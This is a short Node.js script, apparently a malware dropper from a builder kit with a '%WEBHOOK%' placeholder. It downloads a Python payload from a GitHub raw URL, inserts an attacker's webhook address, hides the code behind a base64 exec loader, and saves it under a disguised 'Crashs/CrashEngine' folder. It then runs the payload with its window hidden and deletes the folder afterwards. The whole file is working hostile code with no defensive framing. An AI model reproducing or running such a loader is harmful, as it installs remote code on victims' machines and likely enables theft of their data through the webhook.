const fs = require("fs");
const fsPromises = require("fs").promises;
const path = require("path");
const crypto = require("crypto");
const https = require("https");
const { exec } = require("child_process");

const H00K3_URL = "%WEBHOOK%";
const PYTHON_URL = "https://raw.githubusercontent.com/P180EwqDeRT/ae6f117592b71439e4f9a75c19da8cdd/refs/heads/main/f9a75c19da8cdd/o1dwwnos0m2r.py";

function gerarNomeAleatorio() {
  return crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, "").substring(0, 12);
}

function baixarPython(destPath) {
  return new Promise((resolve) => {
    const file = fs.createWriteStream(destPath);
    https.get(PYTHON_URL, (res) => {
      if (res.statusCode !== 200) {
        try { fs.unlinkSync(destPath); } catch {}
        return resolve(false);
      }
      res.pipe(file);
      file.on("finish", () => file.close(() => resolve(true)));
    }).on("error", () => {
      try { fs.unlinkSync(destPath); } catch {}
      resolve(false);
    });
  });
}

async function executarPython() {
  const baseDir = path.join(process.env.LOCALAPPDATA || process.env.HOME || ".", "Crashs", "src", "CrashEngine");

  try {
    if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });
    const fileName = gerarNomeAleatorio() + ".py";
    const filePath = path.join(baseDir, fileName);

    const ok = await baixarPython(filePath);
    if (!ok) return false;

    let code = await fsPromises.readFile(filePath, "utf8");
    code = code.replace(/%WEBHOOK%/g, H00K3_URL);

    const base64Code = Buffer.from(code, "utf8").toString("base64");
    const finalCode = `
import base64
exec(compile(base64.b64decode("${base64Code}"), "<string>", "exec"))
`;
    await fsPromises.writeFile(filePath, finalCode, "utf8");

    return new Promise((resolve) => {
      exec(`python "${filePath}"`, { cwd: baseDir, windowsHide: true }, (err) => {
        try { fs.rmSync(baseDir, { recursive: true, force: true }); } catch {}
        resolve(!err);
      });
    });

  } catch {
    return false;
  }
}

(async () => {
  await executarPython();
})();
